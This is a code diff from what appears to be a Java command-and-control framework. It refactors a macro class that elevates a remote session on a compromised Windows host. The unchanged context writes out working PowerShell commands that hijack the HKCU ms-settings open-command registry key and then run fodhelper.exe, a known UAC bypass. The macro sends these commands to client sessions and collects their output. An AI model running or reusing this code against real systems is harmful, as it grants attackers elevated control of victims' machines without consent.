@@ -1,5 +1,6 @@
 package c2.session.macro;
 
+import c2.Commands;
 import c2.HarvestProcessor;
 import c2.session.IOManager;
 
@@ -10,7 +11,7 @@ public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {
 	public static final String NEW_ITEM_PROP_CMD = "powershell.exe -c \"New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force";
 	public static final String SET_ITEM_PROP_CMD_B = "' -Force \"";
 	public static final String SET_ITEM_PROP_CMD_A = "powershell.exe -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '";
-	public static final String CLIENT_GET_EXE_CMD = "get_daemon_start_cmd";
+	
 	public static final String ENGAGE_FODHELPER_CMD = "fodhelper.exe";
 	private IOManager io;
 	
@@ -27,8 +28,8 @@ public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {
 	@Override
 	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
 		MacroOutcome outcome = new MacroOutcome();
-		io.sendCommand(sessionId, CLIENT_GET_EXE_CMD);
-		outcome.addSentCommand(CLIENT_GET_EXE_CMD);
+		io.sendCommand(sessionId, Commands.CLIENT_GET_EXE_CMD);
+		outcome.addSentCommand(Commands.CLIENT_GET_EXE_CMD);
 		String clientCmd = io.awaitMultilineCommands(sessionId);
 		outcome.addResponseIo(clientCmd);
 		clientCmd = clientCmd.replace("\r", "");
